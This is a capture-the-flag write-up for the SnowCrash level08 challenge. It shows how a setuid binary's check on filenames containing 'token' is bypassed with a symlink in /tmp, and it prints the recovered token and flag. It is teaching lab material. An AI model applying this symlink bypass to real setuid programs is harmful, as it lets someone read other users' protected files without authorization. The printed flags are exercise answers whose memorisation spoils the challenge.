[README.md](../README.md)
# level08
Upon logging in as level07, we find a file named `level08` in the home directory:
```sh
level08@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
level08@SnowCrash:~$ file level08
level08: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xbe40aba63b7faec62e9414be1b639f394098532f, not stripped
```

The presence of the setuid and setgid bits on an executable file can pose security risks as it enables the program to execute with elevated privileges.

If we try to execute the file:
```sh
level08@SnowCrash:~$ ./level08
./level08 [file to read]
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
```

Based on this behavior, it seems that level08 is a program that expects an argument specifying a file to read, but it prohibits accessing files containing the substring "token".

However, we are unable to create symbolic links to rename the file due to insufficient permissions:
```sh
level08@SnowCrash:~$ ln -s token other_file
ln: failed to create symbolic link `other_file': Permission denied
```

Fortunately, we can still create symbolic links in the /tmp directory, which allows us to bypass the restriction. By linking the file "token" to a different name in the /tmp directory, we can then provide this new path as an argument to level08 and successfully access its contents:
```sh
level08@SnowCrash:~$ ln -s ~/token /tmp/my_file
level08@SnowCrash:~$ ./level08 /tmp/my_file
quif5eloekouj29ke0vouxean
```

This demonstrates how we can use symbolic links in a different directory to rename the file and bypass the restriction imposed by level08.

```sh
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```